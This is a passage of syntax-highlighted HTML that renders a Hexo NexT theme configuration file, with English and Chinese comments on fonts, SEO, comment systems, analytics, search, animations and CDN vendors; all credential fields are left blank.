&lt;body&gt;.</span></span><br><span class="line">  <span class="attr">global:</span></span><br><span class="line">    <span class="attr">external:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">family:</span> <span class="string">Lato</span></span><br><span class="line">    <span class="attr">size:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Font settings for site title (.site-title).</span></span><br><span class="line">  <span class="attr">title:</span></span><br><span class="line">    <span class="attr">external:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">family:</span></span><br><span class="line">    <span class="attr">size:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Font settings for headlines (&lt;h1&gt; to &lt;h6&gt;).</span></span><br><span class="line">  <span class="attr">headings:</span></span><br><span class="line">    <span class="attr">external:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">family:</span></span><br><span class="line">    <span class="attr">size:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Font settings for posts (.post-body).</span></span><br><span class="line">  <span class="attr">posts:</span></span><br><span class="line">    <span class="attr">external:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">family:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Font settings for &lt;code&gt; and code blocks.</span></span><br><span class="line">  <span class="attr">codes:</span></span><br><span class="line">    <span class="attr">external:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">family:</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># SEO Settings 搜索引擎优化</span></span><br><span class="line"><span class="comment"># See: https://theme-next.js.org/docs/theme-settings/seo</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If true, site-subtitle will be added to index page. 浏览器标签页是否显示网站副标题</span></span><br><span class="line"><span class="comment"># Remember to set up your site-subtitle in Hexo `_config.yml` (e.g. subtitle: Subtitle)</span></span><br><span class="line"><span class="attr">index_with_subtitle:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Automatically add external URL with Base64 encrypt &amp; decrypt. 不用改</span></span><br><span class="line"><span class="attr">exturl:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Google Webmaster tools verification.</span></span><br><span class="line"><span class="comment"># See: https://www.google.com/webmasters</span></span><br><span class="line"><span class="attr">google_site_verification:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Bing Webmaster tools verification.</span></span><br><span class="line"><span class="comment"># See: https://www.bing.com/webmaster</span></span><br><span class="line"><span class="attr">bing_site_verification:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Yandex Webmaster tools verification.</span></span><br><span class="line"><span class="comment"># See: https://webmaster.yandex.ru</span></span><br><span class="line"><span class="attr">yandex_site_verification:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Baidu Webmaster tools verification.</span></span><br><span class="line"><span class="comment"># See: https://ziyuan.baidu.com/site</span></span><br><span class="line"><span class="attr">baidu_site_verification:</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Third Party Plugins &amp; Services Settings 第三方插件及服务设置</span></span><br><span class="line"><span class="comment"># See: https://theme-next.js.org/docs/third-party-services/</span></span><br><span class="line"><span class="comment"># More plugins: https://github.com/next-theme/awesome-next</span></span><br><span class="line"><span class="comment"># You may need to install the corresponding dependency packages</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Math Formulas Render Support 数学公式</span></span><br><span class="line"><span class="comment"># Warning: Please install / uninstall the relevant renderer according to the documentation.</span></span><br><span class="line"><span class="comment"># See: https://theme-next.js.org/docs/third-party-services/math-equations</span></span><br><span class="line"><span class="comment"># Server-side plugin: https://github.com/next-theme/hexo-filter-mathjax</span></span><br><span class="line"><span class="attr">math:</span></span><br><span class="line">  <span class="comment"># Default (false) will load mathjax / katex script on demand.</span></span><br><span class="line">  <span class="comment"># That is it only render those page which has `mathjax: true` in Front-matter. 字面意思，关闭则意味着是否渲染公式依赖于每篇文章的设置</span></span><br><span class="line">  <span class="comment"># If you set it to true, it will load mathjax / katex srcipt EVERY PAGE.</span></span><br><span class="line">  <span class="attr">every_page:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">mathjax:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">    <span class="comment"># Available values: none | ams | all</span></span><br><span class="line">    <span class="attr">tags:</span> <span class="string">none</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">katex:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">    <span class="comment"># See: https://github.com/KaTeX/KaTeX/tree/master/contrib/copy-tex</span></span><br><span class="line">    <span class="attr">copy_tex:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Easily enable fast Ajax navigation on your website. 跳转时不加载重复元素，更快跳转，但可能会出现 bug</span></span><br><span class="line"><span class="comment"># For more information: https://github.com/next-theme/pjax</span></span><br><span class="line"><span class="attr">pjax:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># FancyBox is a tool that offers a nice and elegant way to add zooming functionality for images. 放大文章中的图片，和下面的只能开启一个</span></span><br><span class="line"><span class="comment"># For more information: https://fancyapps.com/fancybox</span></span><br><span class="line"><span class="attr">fancybox:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># A JavaScript library for zooming images like Medium. 放大文章中的图片，和上面的只能开启一个</span></span><br><span class="line"><span class="comment"># Warning: Do not enable both `fancybox` and `mediumzoom`.</span></span><br><span class="line"><span class="comment"># For more information: https://medium-zoom.francoischalifour.com</span></span><br><span class="line"><span class="attr">mediumzoom:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Vanilla JavaScript plugin for lazyloading images. 懒加载</span></span><br><span class="line"><span class="comment"># For more information: https://apoorv.pro/lozad.js/demo/</span></span><br><span class="line"><span class="attr">lazyload:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Pangu Support</span></span><br><span class="line"><span class="comment"># For more information: https://github.com/vinta/pangu.js</span></span><br><span class="line"><span class="comment"># Server-side plugin: https://github.com/next-theme/hexo-pangu</span></span><br><span class="line"><span class="attr">pangu:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Quicklink Support</span></span><br><span class="line"><span class="comment"># For more information: https://getquick.link</span></span><br><span class="line"><span class="comment"># Front-matter variable (unsupport home archive).</span></span><br><span class="line"><span class="attr">quicklink:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Home page and archive page can be controlled through home and archive options below.</span></span><br><span class="line">  <span class="comment"># This configuration item is independent of `enable`.</span></span><br><span class="line">  <span class="attr">home:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">archive:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Default (true) will initialize quicklink after the load event fires.</span></span><br><span class="line">  <span class="attr">delay:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># Custom a time in milliseconds by which the browser must execute prefetching.</span></span><br><span class="line">  <span class="attr">timeout:</span> <span class="number">3000</span></span><br><span class="line">  <span class="comment"># Default (true) will attempt to use the fetch() API if supported (rather than link[rel=prefetch]).</span></span><br><span class="line">  <span class="attr">priority:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># For more flexibility you can add some patterns (RegExp, Function, or Array) to ignores.</span></span><br><span class="line">  <span class="comment"># See: https://github.com/GoogleChromeLabs/quicklink#custom-ignore-patterns</span></span><br><span class="line">  <span class="attr">ignores:</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Comments Settings 评论设置</span></span><br><span class="line"><span class="comment"># See: https://theme-next.js.org/docs/third-party-services/comments</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Multiple Comment System Support</span></span><br><span class="line"><span class="attr">comments:</span></span><br><span class="line">  <span class="comment"># Available values: tabs | buttons</span></span><br><span class="line">  <span class="attr">style:</span> <span class="string">tabs</span></span><br><span class="line">  <span class="comment"># Choose a comment system to be displayed by default.</span></span><br><span class="line">  <span class="comment"># Available values: disqus | disqusjs | changyan | livere | gitalk | utterances</span></span><br><span class="line">  <span class="attr">active:</span></span><br><span class="line">  <span class="comment"># Setting `true` means remembering the comment system selected by the visitor.</span></span><br><span class="line">  <span class="attr">storage:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># Lazyload all comment systems.</span></span><br><span class="line">  <span class="attr">lazyload:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># Modify texts or order for any navs, here are some examples.</span></span><br><span class="line">  <span class="attr">nav:</span></span><br><span class="line">    <span class="comment">#disqus:</span></span><br><span class="line">    <span class="comment">#  text: Load Disqus</span></span><br><span class="line">    <span class="comment">#  order: -1</span></span><br><span class="line">    <span class="comment">#gitalk:</span></span><br><span class="line">    <span class="comment">#  order: -2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Disqus</span></span><br><span class="line"><span class="attr">disqus:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">shortname:</span></span><br><span class="line">  <span class="attr">count:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DisqusJS</span></span><br><span class="line"><span class="comment"># For more information: https://disqusjs.skk.moe</span></span><br><span class="line"><span class="attr">disqusjs:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># API Endpoint of Disqus API (https://disqus.com/api/docs).</span></span><br><span class="line">  <span class="comment"># Leave api empty if you are able to connect to Disqus API. Otherwise you need a reverse proxy for it.</span></span><br><span class="line">  <span class="comment"># For example:</span></span><br><span class="line">  <span class="comment"># api: https://disqus.skk.moe/disqus/</span></span><br><span class="line">  <span class="attr">api:</span></span><br><span class="line">  <span class="attr">apikey:</span> <span class="comment"># Register new application from https://disqus.com/api/applications/</span></span><br><span class="line">  <span class="attr">shortname:</span> <span class="comment"># See: https://disqus.com/admin/settings/general/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Changyan</span></span><br><span class="line"><span class="attr">changyan:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">appid:</span></span><br><span class="line">  <span class="attr">appkey:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># LiveRe comments system</span></span><br><span class="line"><span class="comment"># You can get your uid from https://livere.com/insight/myCode (General web site)</span></span><br><span class="line"><span class="attr">livere_uid:</span> <span class="comment"># &lt;your_uid&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Gitalk</span></span><br><span class="line"><span class="comment"># For more information: https://gitalk.github.io</span></span><br><span class="line"><span class="attr">gitalk:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">github_id:</span> <span class="comment"># GitHub repo owner</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="comment"># Repository name to store issues</span></span><br><span class="line">  <span class="attr">client_id:</span> <span class="comment"># GitHub Application Client ID</span></span><br><span class="line">  <span class="attr">client_secret:</span> <span class="comment"># GitHub Application Client Secret</span></span><br><span class="line">  <span class="attr">admin_user:</span> <span class="comment"># GitHub repo owner and collaborators, only these guys can initialize gitHub issues</span></span><br><span class="line">  <span class="attr">distraction_free_mode:</span> <span class="literal">true</span> <span class="comment"># Facebook-like distraction free mode</span></span><br><span class="line">  <span class="comment"># Gitalk&#x27;s display language depends on user&#x27;s browser or system environment</span></span><br><span class="line">  <span class="comment"># If you want everyone visiting your site to see a uniform language, you can set a force language value</span></span><br><span class="line">  <span class="comment"># Available values: en | es-ES | fr | ru | zh-CN | zh-TW</span></span><br><span class="line">  <span class="attr">language:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Utterances</span></span><br><span class="line"><span class="comment"># For more information: https://utteranc.es</span></span><br><span class="line"><span class="attr">utterances:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="comment"># Github repository name</span></span><br><span class="line">  <span class="comment"># Available values: pathname | url | title | og:title</span></span><br><span class="line">  <span class="attr">issue_term:</span> <span class="string">pathname</span></span><br><span class="line">  <span class="comment"># Available values: github-light | github-dark | preferred-color-scheme | github-dark-orange | icy-dark | dark-blue | photon-dark | boxy-light</span></span><br><span class="line">  <span class="attr">theme:</span> <span class="string">github-light</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Isso</span></span><br><span class="line"><span class="comment"># For more information: https://posativ.org/isso/</span></span><br><span class="line"><span class="attr">isso:</span> <span class="comment"># &lt;data_isso&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Post Widgets &amp; Content Sharing Services</span></span><br><span class="line"><span class="comment"># See: https://theme-next.js.org/docs/third-party-services/post-widgets</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Star rating support to each article.</span></span><br><span class="line"><span class="comment"># To get your ID visit https://widgetpack.com</span></span><br><span class="line"><span class="attr">rating:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">id:</span>     <span class="comment"># &lt;app_id&gt;</span></span><br><span class="line">  <span class="attr">color:</span>  <span class="string">&quot;#fc6423&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># AddThis Share. See: https://www.addthis.com</span></span><br><span class="line"><span class="comment"># Go to https://www.addthis.com/dashboard to customize your tools.</span></span><br><span class="line"><span class="attr">add_this_id:</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Statistics and Analytics</span></span><br><span class="line"><span class="comment"># See: https://theme-next.js.org/docs/third-party-services/statistics-and-analytics</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Google Analytics 谷歌分析</span></span><br><span class="line"><span class="comment"># See: https://analytics.google.com</span></span><br><span class="line"><span class="attr">google_analytics:</span></span><br><span class="line">  <span class="attr">tracking_id:</span> <span class="comment"># &lt;app_id&gt;</span></span><br><span class="line">  <span class="comment"># By default, NexT will load an external gtag.js script on your site.</span></span><br><span class="line">  <span class="comment"># If you only need the pageview feature, set the following option to true to get a better performance.</span></span><br><span class="line">  <span class="attr">only_pageview:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Baidu Analytics 百度统计</span></span><br><span class="line"><span class="comment"># See: https://tongji.baidu.com</span></span><br><span class="line"><span class="attr">baidu_analytics:</span> <span class="comment"># &lt;app_id&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Growingio Analytics</span></span><br><span class="line"><span class="comment"># See: https://www.growingio.com</span></span><br><span class="line"><span class="attr">growingio_analytics:</span> <span class="comment"># &lt;project_id&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Cloudflare Web Analytics</span></span><br><span class="line"><span class="comment"># See: https://www.cloudflare.com/web-analytics/</span></span><br><span class="line"><span class="attr">cloudflare_analytics:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Show number of visitors of each article. 访客统计 leancloud</span></span><br><span class="line"><span class="comment"># You can visit https://www.leancloud.cn to get AppID and AppKey.</span></span><br><span class="line"><span class="attr">leancloud_visitors:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">app_id:</span> <span class="comment"># &lt;your app id&gt;</span></span><br><span class="line">  <span class="attr">app_key:</span> <span class="comment"># &lt;your app key&gt;</span></span><br><span class="line">  <span class="comment"># Required for apps from CN region</span></span><br><span class="line">  <span class="attr">server_url:</span> <span class="comment"># &lt;your server url&gt;</span></span><br><span class="line">  <span class="comment"># Dependencies: https://github.com/theme-next/hexo-leancloud-counter-security</span></span><br><span class="line">  <span class="comment"># If you don&#x27;t care about security in leancloud counter and just want to use it directly</span></span><br><span class="line">  <span class="comment"># (without hexo-leancloud-counter-security plugin), set `security` to `false`.</span></span><br><span class="line">  <span class="attr">security:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Another tool to show number of visitors to each article.</span></span><br><span class="line"><span class="comment"># Visit https://console.firebase.google.com/u/0/ to get apiKey and projectId.</span></span><br><span class="line"><span class="comment"># Visit https://firebase.google.com/docs/firestore/ to get more information about firestore.</span></span><br><span class="line"><span class="attr">firestore:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">collection:</span> <span class="string">articles</span> <span class="comment"># Required, a string collection name to access firestore database</span></span><br><span class="line">  <span class="attr">apiKey:</span> <span class="comment"># Required</span></span><br><span class="line">  <span class="attr">projectId:</span> <span class="comment"># Required</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Show Views / Visitors of the website / page with busuanzi. 访客统计 不蒜子</span></span><br><span class="line"><span class="comment"># For more information: http://ibruce.info/2015/04/04/busuanzi</span></span><br><span class="line"><span class="attr">busuanzi_count:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">total_visitors:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">total_visitors_icon:</span> <span class="string">fa</span> <span class="string">fa-user</span></span><br><span class="line">  <span class="attr">total_views:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">total_views_icon:</span> <span class="string">fa</span> <span class="string">fa-eye</span></span><br><span class="line">  <span class="attr">post_views:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">post_views_icon:</span> <span class="string">fa</span> <span class="string">fa-eye</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Search Services 搜索服务</span></span><br><span class="line"><span class="comment"># See: https://theme-next.js.org/docs/third-party-services/search-services</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Algolia Search</span></span><br><span class="line"><span class="comment"># For more information: https://www.algolia.com</span></span><br><span class="line"><span class="attr">algolia_search:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">hits:</span></span><br><span class="line">    <span class="attr">per_page:</span> <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Local Search</span></span><br><span class="line"><span class="comment"># Dependencies: https://github.com/next-theme/hexo-generator-searchdb</span></span><br><span class="line"><span class="attr">local_search:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># If auto, trigger search by changing input.</span></span><br><span class="line">  <span class="comment"># If manual, trigger search by pressing enter key or search button.</span></span><br><span class="line">  <span class="attr">trigger:</span> <span class="string">auto</span></span><br><span class="line">  <span class="comment"># Show top n results per article, show all results by setting to -1</span></span><br><span class="line">  <span class="attr">top_n_per_article:</span> <span class="number">1</span></span><br><span class="line">  <span class="comment"># Unescape html strings to the readable one.</span></span><br><span class="line">  <span class="attr">unescape:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># Preload the search data when the page loads.</span></span><br><span class="line">  <span class="attr">preload:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Chat Services 聊天服务</span></span><br><span class="line"><span class="comment"># See: https://theme-next.js.org/docs/third-party-services/chat-services</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Chatra Support</span></span><br><span class="line"><span class="comment"># For more information: https://chatra.com</span></span><br><span class="line"><span class="comment"># Dashboard: https://app.chatra.io/settings/general</span></span><br><span class="line"><span class="attr">chatra:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">async:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">id:</span> <span class="comment"># Visit Dashboard to get your ChatraID</span></span><br><span class="line">  <span class="comment">#embed: # Unfinished experimental feature for developers. See: https://chatra.com/help/api/#injectto</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Tidio Support</span></span><br><span class="line"><span class="comment"># For more information: https://www.tidio.com</span></span><br><span class="line"><span class="comment"># Dashboard: https://www.tidio.com/panel/dashboard</span></span><br><span class="line"><span class="attr">tidio:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">key:</span> <span class="comment"># Public Key, get it from dashboard. See: https://www.tidio.com/panel/settings/developer</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Tags Settings 标签服务</span></span><br><span class="line"><span class="comment"># See: https://theme-next.js.org/docs/tag-plugins/</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Note tag (bootstrap callout)</span></span><br><span class="line"><span class="attr">note:</span></span><br><span class="line">  <span class="comment"># Note tag style values:</span></span><br><span class="line">  <span class="comment">#  - simple    bootstrap callout old alert style. Default.</span></span><br><span class="line">  <span class="comment">#  - modern    bootstrap callout new (v2-v3) alert style.</span></span><br><span class="line">  <span class="comment">#  - flat      flat callout style with background, like on Mozilla or StackOverflow.</span></span><br><span class="line">  <span class="comment">#  - disabled  disable all CSS styles import of note tag.</span></span><br><span class="line">  <span class="attr">style:</span> <span class="string">simple</span></span><br><span class="line">  <span class="attr">icons:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># Offset lighter of background in % for modern and flat styles (modern: -12 | 12; flat: -18 | 6).</span></span><br><span class="line">  <span class="comment"># Offset also applied to label tag variables. This option can work with disabled note tag.</span></span><br><span class="line">  <span class="attr">light_bg_offset:</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Tabs tag</span></span><br><span class="line"><span class="attr">tabs:</span></span><br><span class="line">  <span class="attr">transition:</span></span><br><span class="line">    <span class="attr">tabs:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">labels:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PDF tag</span></span><br><span class="line"><span class="comment"># NexT will try to load pdf files natively, if failed, pdf.js will be used.</span></span><br><span class="line"><span class="comment"># So, you have to install the dependency of pdf.js if you want to use pdf tag and make it available to all browsers.</span></span><br><span class="line"><span class="comment"># Dependencies: https://github.com/next-theme/theme-next-pdf</span></span><br><span class="line"><span class="attr">pdf:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># Default height</span></span><br><span class="line">  <span class="attr">height:</span> <span class="string">500px</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Mermaid tag</span></span><br><span class="line"><span class="attr">mermaid:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># Available themes: default | dark | forest | neutral</span></span><br><span class="line">  <span class="attr">theme:</span> <span class="string">forest</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Animation Settings 动态效果设置</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Use Animate.css to animate everything.</span></span><br><span class="line"><span class="comment"># For more information: https://animate.style</span></span><br><span class="line"><span class="attr">motion:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">async:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">transition:</span></span><br><span class="line">    <span class="comment"># All available transition variants: https://theme-next.js.org/animate/</span></span><br><span class="line">    <span class="attr">post_block:</span> <span class="string">fadeIn</span></span><br><span class="line">    <span class="attr">post_header:</span> <span class="string">fadeInDown</span></span><br><span class="line">    <span class="attr">post_body:</span> <span class="string">fadeInDown</span></span><br><span class="line">    <span class="attr">coll_header:</span> <span class="string">fadeInLeft</span></span><br><span class="line">    <span class="comment"># Only for Pisces | Gemini.</span></span><br><span class="line">    <span class="attr">sidebar:</span> <span class="string">fadeInUp</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Progress bar in the top during page loading.</span></span><br><span class="line"><span class="comment"># For more information: https://github.com/rstacruz/nprogress</span></span><br><span class="line"><span class="attr">nprogress:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">spinner:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Canvas ribbon</span></span><br><span class="line"><span class="comment"># For more information: https://github.com/hustcc/ribbon.js</span></span><br><span class="line"><span class="attr">canvas_ribbon:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">size:</span> <span class="number">300</span> <span class="comment"># The width of the ribbon</span></span><br><span class="line">  <span class="attr">alpha:</span> <span class="number">0.6</span> <span class="comment"># The transparency of the ribbon</span></span><br><span class="line">  <span class="attr">zIndex:</span> <span class="number">-1</span> <span class="comment"># The display level of the ribbon</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#! ==============================================================</span></span><br><span class="line"><span class="comment">#! DO NOT EDIT THE FOLLOWING SETTINGS</span></span><br><span class="line"><span class="comment">#! UNLESS YOU KNOW WHAT YOU ARE DOING</span></span><br><span class="line"><span class="comment">#! See: https://theme-next.js.org/docs/advanced-settings/vendors</span></span><br><span class="line"><span class="comment">#! ==============================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># It&#x27;s recommended to use the same version as in `_vendors.yml` to avoid potential problems.</span></span><br><span class="line"><span class="comment"># Remember to use the HTTPS protocol of CDN links when you enable HTTPS on your site.</span></span><br><span class="line"><span class="attr">vendors:</span></span><br><span class="line">  <span class="comment"># The CDN provider of NexT internal scripts.</span></span><br><span class="line">  <span class="comment"># Available values: local | jsdelivr | unpkg | cdnjs</span></span><br><span class="line">  <span class="comment"># Warning: If you are using the latest master branch of NexT, please set `internal: local`</span></span><br><span class="line">  <span class="attr">internal:</span> <span class="string">local</span></span><br><span class="line">  <span class="comment"># The default CDN provider of third-party plugins.</span></span><br><span class="line">  <span class="comment"># Available values: local | jsdelivr | unpkg | cdnjs</span></span><br><span class="line">  <span class="comment"># Dependencies for `plugins: local`: https://github.com/next-theme/plugins</span></span><br><span class="line">  <span class="attr">plugins:</span> <span class="string">jsdelivr</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># In the following settings, you can specify the CDN link for each plugin.</span></span><br><span class="line">  <span class="comment"># If left blank, the default CDN provider set by `plugins` option will be used.</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Anime.js</span></span><br><span class="line">  <span class="comment"># For more information: https://animejs.com</span></span><br><span class="line">  <span class="attr">anime:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Font Awesome</span></span><br><span class="line">  <span class="comment"># For more information: https://fontawesome.com</span></span><br><span class="line">  <span class="attr">fontawesome:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Prism</span></span><br><span class="line">  <span class="attr">prism:</span></span><br><span class="line">  <span class="attr">prism_autoloader:</span></span><br><span class="line">  <span class="attr">prism_line_numbers:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># MathJax</span></span><br><span class="line">  <span class="attr">mathjax:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># KaTeX</span></span><br><span class="line">  <span class="attr">katex:</span></span><br><span class="line">  <span class="attr">copy_tex_js:</span></span><br><span class="line">  <span class="attr">copy_tex_css:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Pjax</span></span><br><span class="line">  <span class="attr">pjax:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># FancyBox</span></span><br><span class="line">  <span class="attr">jquery:</span></span><br><span class="line">  <span class="attr">fancybox_js:</span></span><br><span class="line">  <span class="attr">fancybox_css:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Medium-zoom</span></span><br><span class="line">  <span class="attr">mediumzoom:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Lazyload</span></span><br><span class="line">  <span class="attr">lazyload:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Pangu</span></span><br><span class="line">  <span class="attr">pangu:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Quicklink</span></span><br><span class="line">  <span class="attr">quicklink:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># DisqusJS</span></span><br><span class="line">  <span class="attr">disqusjs_js:</span></span><br><span class="line">  <span class="attr">disqusjs_css:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Gitalk</span></span><br><span class="line">  <span class="attr">gitalk_js:</span></span><br><span class="line">  <span class="attr">gitalk_css:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Firebase</span></span><br><span class="line">  <span class="attr">firebase_app:</span></span><br><span class="line">  <span class="attr">firebase_firestore:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Algolia Search</span></span><br><span class="line">  <span 